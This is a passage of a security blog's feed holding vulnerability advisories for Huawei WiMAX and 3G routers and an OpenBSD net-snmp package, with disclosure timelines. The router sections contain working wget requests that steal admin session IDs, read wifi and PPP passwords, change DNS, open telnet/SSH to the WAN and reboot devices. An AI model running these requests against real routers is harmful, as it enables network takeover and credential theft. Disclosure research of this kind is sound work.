<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <author>Pierre Kim &lt;pierre.kim.sec@gmail.com&gt;</author>
    <title>A slice of Kimchi - IT Security Blog</title>
    
    <entry>
        <title>Huawei Wimax routers vulnerable to multiple threats</title>
        <link href="2015-12-01-Huawei-Wimax-routers-vulnerable-to-multiple-threats.html"/>
        <content type="html"><h2>Product Description</h2>
<p>Huawei Technologies Co. Ltd. is a Chinese multinational networking
and telecommunications equipment and services company.
It is the largest telecommunications equipment manufacturer in the world.</p>
<h2>Vulnerabilities Summary</h2>
<p>The Huawei BM626e device is a Wimax router / access point overall badly
designed with a lot of vulnerabilities. The device is provided by
MTN Cote d'Ivoire as a "Wibox". It's available in a number of countries to
provide Internet with a Wimax network.</p>
<p>The tests below are done using the last available firmware
(firmware V100R001CIVC24B010).</p>
<p>Note: This firmware is being used by other Huawei Wimax CPEs and
Huawei confirmed that the devices below are vulnerable to the same threats:</p>
<ul>
<li>EchoLife BM626e WiMAX CPE</li>
<li>EchoLife BM626 WiMAX CPE</li>
<li>EchoLife BM635 WiMAX CPE</li>
<li>EchoLife BM632 WiMAX CPE</li>
<li>EchoLife BM631a WiMAX CPE</li>
<li>EchoLife BM632w WiMAX CPE</li>
<li>EchoLife BM652 WiMAX CPE</li>
</ul>
<p>The routers are still on sale and used in several countries. They are used, at least, in these countries:</p>
<ul>
<li>MTN CI (Cote d'Ivoire)</li>
<li>Iran Cell (Iran)</li>
<li>Irak Telecom (Irak)</li>
<li>Libyamax (Libya)</li>
<li>Globe Telecom (Philippines)</li>
<li>Zain Bahrain (Bahrain)</li>
<li>FreshTel (Ukraine)</li>
</ul>
<h2>Details - unauthenticated information disclosure</h2>
<p>By default, the webpage <code>http://192.168.1.1/check.html</code> contains important information
(wimax configuration, network configuration, wifi and sip configuration ...) and is reachable without authentication.</p>
<p>A JavaScript redirection will annoy the attacker (<code>/login.html</code>) and can be easily defeated by using wget:</p>
<pre><code>root@kali:~# wget http://192.168.1.1/check.html; less check.html
</code></pre>
<h2>Details - Admin session cookie hijacking</h2>
<p>If an admin is currently managing the device (OR used the device but didn't properly disconnect),
the current/used session can be stolen by an attacker located in the LAN (or WAN if the HTTP is open in the WAN interface).</p>
<p>The admin session id ("SID") can be recovered in multiple webpages without authentication:</p>
<ul>
<li>http://192.168.1.1/wimax/security.html</li>
<li>http://192.168.1.1/static/deviceinfo.html</li>
<li>...</li>
</ul>
<p>The security.html webpage contains a valid session ID, without authentication, within the JavaScript sources:</p>
<pre><code>sid="SID24188"
</code></pre>
<p>A "protection" is written in JavaScript and will redirect the attacker to the login webpage
but the Javascript contains the session of the admin (sid="SIDXXXXX") so the attacker can retrieve it easily using wget:</p>
<pre><code>root@kali:~# wget http://192.168.1.1/wimax/security.html ; less security.html
root@kali:~# wget http://192.168.1.1/static/deviceinfo.html ; less deviceinfo.html
</code></pre>
<p>Note that, by visiting the webpages, the attacker will also disconnect the administrator from the Control Panel (<code>http://192.168.1.1/</code>)</p>
<h2>Details - Information disclosure and CSRF using the stolen admin session ID</h2>
<p>By using the previously stolen SID, it is possible to perform administration tasks without having proper credentials:</p>
<ul>
<li>editing the WLAN configuration,</li>
<li>editing the WAN configuation,</li>
<li>editing the LAN configuration,</li>
<li>opening HTTP/HTTPS/TELNET/SSH in the LAN and WAN interfaces,</li>
<li>changing DMZ configurations,</li>
<li>editing PortMapping,</li>
<li>editing Porttrigger,</li>
<li>editing SIP configuration,</li>
<li>uploading a custom firmware,</li>
<li>...</li>
</ul>
<p><strong>Retrieve private information (network information):</strong></p>
<pre><code>root@kali:~# wget -qO- 'http://192.168.1.1/static/rethdhcp.jsx?WWW_SID=SID24188&amp;t=0'
Saving to: `STDOUT'

stats={};do{stats.dhcplist="44:8A:5B:AA:AA:AA,192.168.1.3,71:52:02@00:E0:4C:AA:AA:AA,192.168.1.2,71:52:02";
stats.reth="
   eth0      Link encap:Ethernet  HWaddr 34:6B:D3:AA:AA:AA
       UP BROADCAST RUNNING PROMISC MULTICAST  MTU:1500  Metric:1
       RX packets:27 errors:0 dropped:0 overruns:0 frame:0
       TX packets:109 errors:0 dropped:0 overruns:0 carrier:0
       collisions:0 txqueuelen:1000
       RX bytes:2887 (2.8 KiB)  TX bytes:46809 (45.7 KiB)
       Interrupt:9 Base address:0x4000
   eth1      Link encap:Ethernet  HWaddr 34:6B:D3:AA:AA:AA
       UP BROADCAST PROMISC MULTICAST  MTU:1500  Metric:
       RX packets:0 errors:0 dropped:0 overruns:0 frame:0
       TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
       collisions:0 txqueuelen:1000
       RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)
       Interrupt:9 Base address:0x4000
    eth2      Link encap:Ethernet  HWaddr 34:6B:D3:AA:AA:AA
       UP BROADCAST RUNNING PROMISC MULTICAST  MTU:1500  Metric:1
       RX packets:2530 errors:0 dropped:0 overruns:0 frame:0
       TX packets:2619 errors:0 dropped:0 overruns:0 carrier:0
       collisions:0 txqueuelen:1000
       RX bytes:351557 (343.3 KiB)  TX bytes:536669 (524.0 KiB)
       Interrupt:9 Base address:0x4000
    eth3      Link encap:Ethernet  HWaddr 34:6B:D3:AA:AA:AA
       UP BROADCAST PROMISC MULTICAST  MTU:1500  Metric:1
       RX packets:0 errors:0 dropped:0 overruns:0 frame:0
       TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
       collisions:0 txqueuelen:1000
       RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)
       Interrupt:9 Base address:0x4000
";stats.wlaninfo="
wl0       Link encap:Ethernet  HWaddr 34:6B:D3:AA:AA:AA
       UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
       RX packets:5257 errors:0 dropped:0 overruns:0 frame:0
       TX packets:846 errors:0 dropped:0 overruns:0 carrier:0
       collisions:0 txqueuelen:1000
       RX bytes:1117126 (1.0 MiB)  TX bytes:279600 (273.0 KiB)
 wl1       Link encap:Ethernet  HWaddr 34:6B:D3:AA:AA:AA
       UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
       RX packets:0 errors:0 dropped:0 overruns:0 frame:0
       [...]

root@kali:~#
</code></pre>
<p><strong>Retrieve private information:</strong></p>
<p>An other JSX webpage: <code>http://192.168.1.1/advanced/WANconnect.jsx?WWW_SID=SID24188&amp;&amp;t=0</code></p>
<pre><code>root@kali:~# wget -qO- 'http://192.168.1.1/advanced/WANconnect.jsx?WWW_SID=SID24188&amp;&amp;t=0'
stats={};do{stats.PPPoEStatus='Disconnected'; stats.GREStatus='Disconnected';stats.wpsmode="7";stats.position="Idle,Idle,"}while(0);
</code></pre>
<p>It's possible to get a lot of information by abusing JSX webpages. Listing the JSX webpages is left as an exercise for the reader.</p>
<p>The Session ID can be used to change parameters in the Wimax router too:</p>
<p><strong>Editing the WLAN configuration:</strong></p>
<p>This request will change the first SSID name to 'powned' (you need to edit the WWW_SID, by the one provided in the <code>/wimax/security.html</code> webpage):</p>
<pre><code>root@kali:~# wget --no-cookies --header "Cookie: LoginTimes=0:LoginOverTime=0; FirstMenu=User_1; SecondMenu=User_1_1; ThirdMenu=User_1_1_1" --post-data='WWW_SID=SID24188&amp;REDIRECT=wlan.html&amp;SERVICE=wifi&amp;SLEEP=2&amp;WLAN_WifiEnable=1&amp;Wlan_chkbox=0&amp;WLAN_WirelessMode=9&amp;WLAN_Channel=0&amp;WLAN_SSID1=powned&amp;WLAN_HideSSID=0%3B0%3B&amp;WLAN_AuthMode=WPAPSKWPA2PSK%3BWPAPSKWPA2PSK%3B&amp;WLAN_EncrypType=TKIPAES%3BTKIPAES%3B&amp;WLAN_COUNTRY_REGION=1&amp;WLAN_Country_Code=1d&amp;WLAN_TXPOWER_NOR=13&amp;WLAN_MAXNUM_STA=16%3B16%3B&amp;WLAN_FragThreshold=2346&amp;WLAN_BeaconPeriod=100&amp;WLAN_RTSThreshold=2347&amp;WLAN_BssidNum=2&amp;WLAN_WscConfMode=7&amp;WLAN_WscAction=3&amp;WLAN_CountryCode=CI&amp;WLAN_WscPinCode=&amp;WLAN_TXRATE=0&amp;WLAN_HTBW=0&amp;WLAN_NTH_SSID=1&amp;WLAN_PinFlag=2' http://192.168.1.1/basic/mtk.cgi
</code></pre>
<p><strong>Opening the management interface:</strong></p>
<p>This request will open HTTP/HTTPS/TELNET/SSH in the LAN AND the WAN interfaces (you need to edit the WWW_SID, by the one provided in the <code>/wimax/security.html</code> webpage):</p>
<pre><code>root@kali:~# wget --no-cookies --header "Cookie: LoginTimes=0:LoginOverTime=0; FirstMenu=User_2; SecondMenu=User_2_1; ThirdMenu=User_2_1_0" --post-data='WWW_SID=SID24188&amp;REDIRECT=acl.html&amp;SERVICE=mini_httpd%2Cmini_httpsd%2Ctelnetd%2Cdropbear&amp;SLEEP=2&amp;HTTPD_ENABLE=1&amp;HTTPSD_ENABLE=1&amp;MGMT_WEB_WAN=1&amp;MGMT_TELNET_LAN=1&amp;MGMT_TELNET_WAN=1&amp;MGMT_SSH_LAN=1&amp;MGMT_SSH_WAN=1&amp;HTTPD_PORT=80&amp;httpslan=getValue%28&amp;HTTPSD_PORT=443&amp;TELNETD_PORT=23&amp;SSHD_PORT=22' http://192.168.1.1/basic/mtk.cgi
</code></pre>
<p>(The legit administrator can check the changes here: <code>http://192.168.1.1/advanced/acl.html</code>)</p>
<p><strong>Changing "DMZ action" - redirecting WAN ports to a target client located in the LAN</strong> (you need to edit the WWW_SID, by the one provided in the <code>/wimax/security.html</code> webpage):</p>
<pre><code>root@kali:~# wget --no-cookies --header "Cookie: LoginTimes=0:LoginOverTime=0; FirstMenu=User_2; SecondMenu=User_2_1; ThirdMenu=User_2_1_0" --post-data='WWW_SID=SID24188&amp;REDIRECT=dmz.html&amp;SERVICE=netfilter_dmz&amp;NETFILTER_DMZ_HOST=192.168.1.2&amp;NETFILTER_DMZ_ENABLE=1&amp;DMZInterface=InternetGatewayDevice.WANDevice.1.WANConnectionDevice.1.WANIPConnection.1&amp;DMZHostIPAddress=192.168.1.2&amp;DMZEnable=on&amp;TriggerPort=&amp;TriggerPortEnd=' http://192.168.1.1/advanced/user.cgi
</code></pre>
<p>(The legit administrator can check the changes here: <code>http://192.168.1.1/advanced/dmz.html</code>)</p>
<p>Other actions are possible and are left as an exercise for the reader:</p>
<ul>
<li>Editing PortMapping</li>
<li>Editing Porttrigger</li>
<li>Editing Sip configuration</li>
<li>Uploading a custom firmware</li>
<li>...</li>
</ul>
<h2>Vendor Response</h2>
<p>The vulnerable routers are in the End Of Service cycle and will not be
supported anymore.</p>
<p>The vendor encourages its clients to discard existing unsupported models
and to use new routers.</p>
<p><a href="http://www1.huawei.com/en/security/psirt/security-bulletins/security-notices/hw-464086.htm">Official Huawei Security Notice</a></p>
<h2>Report Timeline</h2>
<ul>
<li>Jul 01, 2015: Vulnerabilities found by Pierre Kim.</li>
<li>Oct 28, 2015: Huawei PSIRT is notified of the vulnerabilities.</li>
<li>Oct 28, 2015: Huawei PSIRT confirms the notification.</li>
<li>Nov 03, 2015: Huawei PSIRT is unable to reproduce the vulnerabilities ("We cannot open the following web pages without authentication")</li>
<li>Nov 03, 2015: Pierre Kim informs Huawei to desactivate JavaScript and gives Huawei a complete scenario with Linux commands. Pierre Kim asks their firmware version.</li>
<li>Nov 04, 2015: Pierre Kim asks Huawei about potential difficulties with the provided scenario.</li>
<li>Nov 05, 2015: Huawei PSIRT says that they are currently working on the firmware version issue and will notify in due course.</li>
<li>Nov 09, 2015: Huawei PSIRT confirms the vulnerabilities affecting EchoLife BM626e WiMAX CPE. "All the versions of this product are vulnerable".</li>
<li>Nov 09, 2015: Pierre Kim asks about 8 other Wimax models which are likely to be vulnerable too (using the same firmware) and asks about if security patches will be distributed or the devices are EoL.</li>
<li>Nov 11, 2015: Huawei PSIRT notifies the investigation of 8 other Wimax models is in progress.</li>
<li>Nov 18, 2015: Huawei PSIRT confirms 6 models are affected (EchoLife BM626 WiMAX CPE, EchoLife BM635 WiMAX CPE, EchoLife BM632 WiMAX CPE, EchoLife BM631a WiMAX CPE, EchoLife BM632w WiMAX CPE, EchoLife BM652 WiMAX CPE). The routers are in the End Of Service cycle and Huawei would not support these models or provide fixed version or patch.</li>
<li>Nov 18, 2015: Huawei PSIRT asks to be notified when the advisory is posted.</li>
<li>Nov 19, 2015: Pierre Kim contacts CERT.org about the vulnerabilities.</li>
<li>Nov 23, 2015: Cert.org assigns VU#406192.</li>
<li>Nov 30, 2015: Pierre Kim indicates to Huawei PSIRT that he will release the advisory the December 1, 2015.</li>
<li>Dec 01, 2015: A public advisory is sent to security mailing lists.</li>
</ul>
<h2>Credit</h2>
<p>These vulnerabilities were found by Pierre Kim (<a href="https://twitter.com/PierreKimSec">@PierreKimSec</a>).</p>
<h2>References</h2>
<p><a href="https://pierrekim.github.io/advisories/2015-huawei-0x01.txt">https://pierrekim.github.io/advisories/2015-huawei-0x01.txt</a></p>
<p><a href="https://pierrekim.github.io/blog/2015-12-01-Huawei-Wimax-routers-vulnerable-to-multiple-threats.html">https://pierrekim.github.io/blog/2015-12-01-Huawei-Wimax-routers-vulnerable-to-multiple-threats.html</a></p>
<h2>Disclaimer</h2>
<p>This advisory is licensed under a Creative Commons Attribution Non-Commercial
Share-Alike 3.0 License: http://creativecommons.org/licenses/by-nc-sa/3.0/</p></content>
    </entry>
    
    <entry>
        <title>CVE-2015-8100 - OpenBSD package 'net-snmp' information disclosure</title>
        <link href="2015-11-12-CVE-2015-8100-OpenBSD-package-net-snmp-information-disclosure.html"/>
        <content type="html"><h2>Product Description</h2>
<p>Net-SNMP is a suite of applications used to implement SNMP v1, SNMP v2c and
SNMP v3 using both IPv4 and IPv6.</p>
<p>This software is available in OpenBSD as a port (<code>/usr/ports/net/net-snmp</code>).</p>
<h2>Vulnerabilities Summary</h2>
<p>By default, when OpenBSD package and ports are used, the snmpd configuration file
has weak permissions which allows a local user to retrieve sensitive information.</p>
<h2>Details</h2>
<p>By default the permissions of the snmpd configuration file in OpenBSD
are 0644 instead of 0600:</p>
<pre><code># cd /usr/ports/net/net-snmp
# make install clean
[...]
# ls -latr /etc/snmp/snmpd.conf
-rw-r--r--  1 root  wheel  6993 Nov  4 09:16 /etc/snmp/snmpd.conf
#
</code></pre>
<p>The same problem occurs when the provided package is installed with:</p>
<p><code>pkg_add http://ftp.spline.de/pub/OpenBSD/5.8/packages/i386/net-snmp-5.7.3p0.tgz</code>:</p>
<pre><code># ls -latr /etc/snmp/snmpd.conf
-rw-r--r--  1 root  wheel  6993 Nov  4 08:37 /etc/snmp/snmpd.conf
#
</code></pre>
<p>The snmpd configuration file is readable by a local user and contains the credentials
for read-only and read-write access (for SNMPv1, SNMPv2 and SNMPv3 protocols) and
gives a local user unnecessary/dangerous access:</p>
<pre><code>[...]

rocommunity public  default    -V systemonly
#rocommunity secret  10.0.0.0/16
rouser   authOnlyUser
#rwuser   authPrivUser   priv

[...]
</code></pre>
<p>This problem is OpenBSD-specific as the <code>/var/db/pkg/net-snmp-5.7.3p0/+CONTENTS</code> file confirms:</p>
<pre><code>@ts 1438958635
@sample /etc/snmp/snmpd.conf
</code></pre>
<p>Futhermore, by default, <code>/usr/local/sbin/snmpd</code> runs as root.</p>
<h2>Vendor Response</h2>
<p>This problem has been fixed in the -STABLE and -CURRENT packages.</p>
<h2>Report Timeline</h2>
<ul>
<li>Nov 04, 2015: Vulnerability found by Pierre Kim.</li>
<li>Nov 06, 2015: Stuart Henderson is notified of the vulnerability.</li>
<li>Nov 06, 2015: Stuart Henderson confirms the vulnerability and fixes the package permissions for the sample configuration file in -current and -stable.</li>
<li>Nov 06, 2015: Stuart Henderson re-activates an option (can be configured with rc.conf.local) to run net-snmp as a separate uid to improve security.</li>
<li>Nov 10, 2015: OSS-Security is contacted to get a CVE</li>
<li>Nov 10, 2015: cve-assign@mitre.org assigns CVE-2015-8100</li>
<li>Nov 12, 2015: A public advisory is sent to security mailing lists.</li>
</ul>
<h2>Credit</h2>
<p>This vulnerability was found by Pierre Kim (<a href="https://twitter.com/PierreKimSec">@PierreKimSec</a>).</p>
<h2>References</h2>
<p><a href="https://pierrekim.github.io/advisories/CVE-2015-8100-openbsd-net-snmp.txt">https://pierrekim.github.io/advisories/CVE-2015-8100-openbsd-net-snmp.txt</a></p>
<p><a href="http://openports.se/net/net-snmp">http://openports.se/net/net-snmp</a></p>
<h2>Disclaimer</h2>
<p>This advisory is licensed under a Creative Commons Attribution Non-Commercial
Share-Alike 3.0 License: <a href="http://creativecommons.org/licenses/by-nc-sa/3.0/">http://creativecommons.org/licenses/by-nc-sa/3.0/</a></p>
<h2>Complete advisory:</h2>
<pre><code>-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

## Advisory Information

Title: OpenBSD package 'net-snmp' information disclosure
Advisory URL: https://pierrekim.github.io/advisories/CVE-2015-8100-openbsd-net-snmp.txt
Blog URL: https://pierrekim.github.io/blog/2015-11-12-CVE-2015-8100-OpenBSD-package-net-snmp-information-disclosure.html
Date published: 2015-11-12
Vendors contacted: Stuart Henderson, OpenBSD Package maintainer
Release mode: Released
CVE: CVE-2015-8100



## Product Description

Net-SNMP is a suite of applications used to implement SNMP v1, SNMP v2c and
SNMP v3 using both IPv4 and IPv6.

This software is available in OpenBSD as a port (/usr/ports/net/net-snmp).



## Vulnerabilities Summary

By default, when OpenBSD package and ports are used, the snmpd configuration file
has weak permissions which allows a local user to retrieve sensitive information.



## Details

By default the permissions of the snmpd configuration file in OpenBSD
are 0644 instead of 0600:

# cd /usr/ports/net/net-snmp
# make install clean
[...]
# ls -latr /etc/snmp/snmpd.conf
-rw-r--r--  1 root  wheel  6993 Nov  4 09:16 /etc/snmp/snmpd.conf
#

The same problem occurs when the provided package is installed with
`pkg_add http://ftp.spline.de/pub/OpenBSD/5.8/packages/i386/net-snmp-5.7.3p0.tgz`:

# ls -latr /etc/snmp/snmpd.conf
-rw-r--r--  1 root  wheel  6993 Nov  4 08:37 /etc/snmp/snmpd.conf
#

The snmpd configuration file is readable by a local user and contains the credentials
for read-only and read-write access (for SNMPv1, SNMPv2 and SNMPv3 protocols) and
gives a local user unnecessary/dangerous access:


[...]

rocommunity public  default    -V systemonly
#rocommunity secret  10.0.0.0/16
rouser   authOnlyUser
#rwuser   authPrivUser   priv

[...]

This problem is OpenBSD-specific as the /var/db/pkg/net-snmp-5.7.3p0/+CONTENTS file confirms:
@ts 1438958635
@sample /etc/snmp/snmpd.conf

Futhermore, by default, `/usr/local/sbin/snmpd` runs as root.



## Vendor Response

This problem has been fixed in the -STABLE and -CURRENT packages.



## Report Timeline

* Nov 04, 2015: Vulnerability found by Pierre Kim.
* Nov 06, 2015: Stuart Henderson is notified of the vulnerability.
* Nov 06, 2015: Stuart Henderson confirms the vulnerability and fixes the package permissions for the sample configuration file in -current and -stable.
* Nov 06, 2015: Stuart Henderson re-activates an option (can be configured with rc.conf.local) to run net-snmp as a separate uid to improve security.
* Nov 10, 2015: OSS-Security is contacted to get a CVE
* Nov 10, 2015: cve-assign@mitre.org assigns CVE-2015-8100
* Nov 12, 2015: A public advisory is sent to security mailing lists.



## Credit

This vulnerability was found by Pierre Kim (@PierreKimSec).



## References

https://pierrekim.github.io/advisories/CVE-2015-8100-openbsd-net-snmp.txt
http://openports.se/net/net-snmp



## Disclaimer

This advisory is licensed under a Creative Commons Attribution Non-Commercial
Share-Alike 3.0 License: http://creativecommons.org/licenses/by-nc-sa/3.0/

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1

iQIcBAEBCgAGBQJWRKFEAAoJEMQ+Dtp9ky28Jq4P/iUv706dteWtl9HkPHkSVbql
yO8ZJGnJtEXX3SOR5OKd07rxwP4W1gIYJtLSTUfEk+91LRpP8ZNgDIMDG1pIKS5l
2S+6SQ+8yQXCcnm54KAc8DQM3tJHUp/RG8/6UR30V0v83ELnLmAX01BWOMEIvle2
N1cd59cPUZ4Qafee1p8wbyDWi1WBB1d89d7YKf3v78L34COTEBXPRLPs+DQCU7nD
vmGzsFKcNjr8Hr2pq9aQmNmmuE82GtuEk3e1OKR5Pe4uYWoEAuFJOnswFjABDSch
0wvWx1d6G2iOMwPIRLL+BXMgGzPpKB4KjgYPH/3OYJVXywKfEw0pBnu+Svb31/JV
MVnnw6+fuunOLe7GxrI4M5FE2JfMD4CUiarFHRK6I5XDJm1dsvTHIsJUwA+9FTTH
7kJY/xKHJ3YpjrKT2K2WAmvsJCTswkbvPr5LKNGgOLlUzVUetYo1hhGT6fo5ppQE
RMpWkpX1DGJ+5RzlcLhLqguznv/SVwAA78TwailvF28LW2kSHJDOIpUht2xRdQ2Q
JJZwcoO69qsterKF+UCcucWXDSjUjzI/Vrvm/aV+BAu4oKVG5QvVNplbHDYruLl5
9OMF1C5+z8GcQf27u1RG69VAOx66GnPFGTPUiaKfsgqfh3jEMJw3IlT1LBCAZao4
FXQizA+QOejXTiuHqYE9
=qkHs
-----END PGP SIGNATURE-----
</code></pre></content>
    </entry>
    
    <entry>
        <title>A comprehensive study of Huawei 3G routers - XSS, CSRF, DoS, unauthenticated firmware update, RCE</title>
        <link href="2015-10-07-Huawei-routers-vulnerable-to-multiple-threats.html"/>
        <content type="html"><h2>Product Description</h2>
<p>Huawei Technologies Co. Ltd. is a Chinese multinational networking and telecommunications equipment and services company.
It is the largest telecommunications equipment manufacturer in the world.</p>
<h2>Vulnerabilities Summary</h2>
<p>The Huawei B260A device is a 3g modem / access point overall badly designed with a lot of vulnerabilities. The device is provided by Orange Tunisia as a "Flybox". It's available in a lot of countries to provide Internet with a 3G network (Vodafone provides this device, for example). </p>
<p>The tests below are done using the last available firmware (firmware 846.11.15.08.115 - Feb 20 2013).</p>
<p>Note: This firmware seems to be used for these 14 Huawei devices (from http://192.168.1.1/js/u_version.js ) which, therefore, are likely to be vulnerable to the same threats:</p>
<ul>
<li>E960, WLA1GCPU</li>
<li>E968, WLA1GCYU</li>
<li>B970, WLA1GAPU</li>
<li>B932, WLB1TIPU</li>
<li>B933, WLB1TIPU</li>
<li>B220, WLA1GCYU</li>
<li>B260, WLA1GCYU</li>
<li>B270, WLA1GCYU</li>
<li>B972, WLA1GCYU</li>
<li>B200-20, WLB3TILU</li>
<li>B200-30, WLB3TILU</li>
<li>B200-40, WLB3TILU</li>
<li>B200-50, WLB3TILU</li>
<li>??, WLA1GCPU</li>
</ul>
<h2>Details - Cookies</h2>
<p>The Huawei B260A stores the administrator's account name and password in cleartext in a cookie (using base64),
which allows context-dependent attackers to obtain sensitive information by(1) reading a cookie file
and (2) sniffing the network for HTTP headers, and possibly (3) using unspecified other vectors. </p>
<p>The cookie is:</p>
<pre><code>Cookie: Basic=admin:base64(password):0
</code></pre>
<h2>Details - Authentication bypass</h2>
<p>Remote reboot without authentication:</p>
<pre><code>wget -qO- --post-data='action=Reboot&amp;page=resetrouter.asp' http://192.168.1.1/en/apply.cgi
</code></pre>
<p>Second remote reboot without authentication:</p>
<pre><code>wget -qO- --post-data='action=Apply&amp;page=lancfg.asp' 'http://192.168.1.1/en/apply.cgi'
</code></pre>
<p>Grab wifi password without authentication:</p>
<pre><code>wget -qO- 'http://192.168.1.1/js/wlan_cfg.js'|less
</code></pre>
<p>Get PPP passwords without authentication:</p>
<pre><code>wget -qO- 'http://192.168.1.1/js/connection.js'|grep -i 'var profile'
var profile = [["Orange TN","*99#","FIXME","FIXME","0","flyboxgp","1","","0",],[]];
</code></pre>
<p>Grab informations (wifi password, PPP passwords) without authentication:</p>
<pre><code>wget -qO- http://192.168.1.1/js/wizard.js
var current_profile_list = ["Orange TN","*99#","","","0","flyboxgp","1","",];
var profile = [["Orange TN","*99#","","","0","flyboxgp","1","",],[]];
var nv_wl_wpa_psk = "E56479874EB39DB3BC65D8374B";              /**/
var nv_wl_key1 = "";                    /**/
[...]
</code></pre>
<h2>Details - CSRF without authentication</h2>
<p>Change remote DNS without authentication: it allows an attacker to change the upstream DNS servers, so it will impact the clients served by the local dhcpd from the Huawei B260A:</p>
<pre><code>wget -qO- --post-data='lan_lease=86400&amp;dns_settings=static&amp;primary_dns=1.1.3.1&amp;secondary_dns=3.3.3.3&amp;lan_proto=dhcp&amp;dhcp_start=192.168.1.100&amp;dhcp_end=192.168.1.200&amp;lan_ipaddr=192.168.1.1&amp;lan_gateway=192.168.1.1&amp;lan_netmask=255.255.255.0&amp;action=Apply&amp;page=lancfg.asp' 'http://192.168.1.1/en/apply.cgi'
</code></pre>
<p>This can easily be done using a CSRF attack.</p>
<p>Apparently, there are CSRF everywhere (<em>EVERYWHERE</em>).</p>
<h2>Details - Remote DoS without authentication</h2>
<p>Remote DoS against the HTTP server without authentication:</p>
<pre><code>root@linux:~# telnet 192.168.1.1 80
Trying 192.168.1.1...
Connected to 192.168.1.1.
Escape character is '^]'.
x   
Connection closed by foreign host.
root@linux:~# telnet 192.168.1.1 80
Trying 192.168.1.1...
telnet: Unable to connect to remote host: Connection refused
root@linux:~
</code></pre>
<h2>Details - Firmware upload without authentication:</h2>
<p><a href="http://media.orange.tn/executable/maj_flyboxB260A.exe">The program (FMC tool) provided by Tunisia Telecom (from Huawei) to update the firmware sends udp packet to the broacast port 1280 udp</a>. The diag program running in the Huawei B260A replies by sending out information about the versions of the different components of the firmware. The updater tries to login using telnet (admin/admin) protocol to the modem in order to extract firmware versions (if the password is not admin, the update will continue and will work). Then the updater sends directly the files to the modem using 1280/tcp which will overwrite the MTD (Memory Technology Device, ie: flash storage) of the device without authentication:</p>
<p>By sniffing the packets:</p>
<p>1/ telnet connection from the official tool (with admin:admin credentials by default):</p>
<pre><code>HGW login: ......admin
Password: admin

No directory, logging in with HOME=/

BusyBox v0.60.0 (2013.02.20-03:27+0000) Built-in shell (msh)
Enter 'help' for a list of built-in commands.
# nvram get cfe_version
# nvram get app_version
#
</code></pre>
<p>Even if the password is not 'admin', the updating process continues on port 1280/tcp.</p>
<p>2/ In the router, the diag program receives the data in port 1280/tcp, stores the data in files located in /tmp and then uses the <code>write</code> program in the router to overwrite the MTD.</p>
<p>No need to reverse, by using <code>top</code> in the router, we see the <code>write</code> process:</p>
<pre><code>1266 0         S    diagd 
1270 0         S    telnetd 
1822 0         R    write /tmp/uploadh1wNSR FWT  &lt;-- overwrites the MTD
</code></pre>
<p>write is a basic tool used to overwrite the mtdblock (<code>write /path/to/file device</code>, FWT for the MTD):</p>
<pre><code># write
usage: write [path] [device]
</code></pre>
<p>3/ After updating the firmware, you can login as admin/admin using the HTTP control panel and using telnet, allowing you to get a root shell.</p>
<p>This is a default behavior, as stated in the official documentation from the FMC tool:</p>
<pre><code>With this software, you can upgrade the Huawei FMC products in a very simple way.
This software supports the upgrade of five sub-modules, including BOOT of the router module,
APP of the router module, customized files of the router module, the wireless module,
and the dashboard software.
</code></pre>
<p><a href="http://media.orange.tn/executable/maj_flyboxB260A.exe">You can get the last firmware updater at this address</a></p>
<p>(Linux: <code>wget --user-agent="Mozilla" http://media.orange.tn/executable/maj_flyboxB260A.exe</code>)</p>
<p>Huawei doesn't provide directly firmwares for these devices, you have to download them from your ISP.</p>
<p>These ISPs use this router (from <a href="http://www.dlgsm.com/index.php?dir=/FLASH-FILES/HUAWEI/B_Series/B260a">http://www.dlgsm.com/index.php?dir=/FLASH-FILES/HUAWEI/B_Series/B260a</a> ):</p>
<ul>
<li>Argentina Claro</li>
<li>Argentina Movistar</li>
<li>Armenia Orange</li>
<li>Austria H3G</li>
<li>Austria Mobilkom</li>
<li>Brazil VIVO</li>
<li>Brazil CTBC</li>
<li>Jamaica C&amp;W JAMAICA</li>
<li>CTBC Brazil</li>
<li>Chile Entel</li>
<li>Croatia Vipnet</li>
<li>Danmark Hi3G</li>
<li>Ecuador CNT</li>
<li>Estonia Elisa Eesti</li>
<li>Germany E-Plus</li>
<li>Guatemala Tigo</li>
<li>JAMAICA C&amp;W</li>
<li>Jamaica Digicel</li>
<li>Kenya Orange</li>
<li>Mali Orange</li>
<li>Mexico Telcel</li>
<li>Niger Orange</li>
<li>Portugal Optimus</li>
<li>Portugal VDF</li>
<li>Roumania Vodafone</li>
<li>Slovak Telekom</li>
<li>Slovak Orange</li>
<li>Sweden HI3G</li>
<li>Sweden TELE2</li>
<li>Sweden Tele2</li>
<li>Tele2 Germany</li>
<li>Telia Sweden</li>
<li>Tunisia Orange</li>
</ul>
<p>From my research, it is possible to overwrite the default firmware with a custom one without authentication.</p>
<p>It is also possible to sim-unlock the device by sending packets to port 1280/udp.</p>
<p>As stated before, this firmware seems to be used for the below devices, so the devices are likely to be vulnerable to the same threats:</p>
<ul>
<li>E960, WLA1GCPU</li>
<li>E968, WLA1GCYU</li>
<li>B970, WLA1GAPU</li>
<li>B932, WLB1TIPU</li>
<li>B933, WLB1TIPU</li>
<li>B220, WLA1GCYU</li>
<li>B260, WLA1GCYU</li>
<li>B270, WLA1GCYU</li>
<li>B972, WLA1GCYU</li>
<li>B200-20, WLB3TILU</li>
<li>B200-30, WLB3TILU</li>
<li>B200-40, WLB3TILU</li>
<li>B200-50, WLB3TILU</li>
<li>??, WLA1GCPU</li>
</ul>
<h2>Vendor Response</h2>
<p>The vulnerable routers are in the End Of Service cycle and will not be supported anymore.</p>
<p>The vendor encourages people to discard existing unsupported models and to use new routers (B68L and B310).</p>
<p><a href="http://www1.huawei.com/en/security/psirt/security-bulletins/security-notices/hw-456466.htm">Official Huawei Security Notice</a></p>
<h2>Report Timeline</h2>
<ul>
<li>Aug 21, 2014: Vulnerabilities found by Pierre Kim.</li>
<li>Aug 24, 2015: Huawei PSIRT is notified of the vulnerabilities.</li>
<li>Aug 25, 2015: Huawei PSIRT confirms the notification.</li>
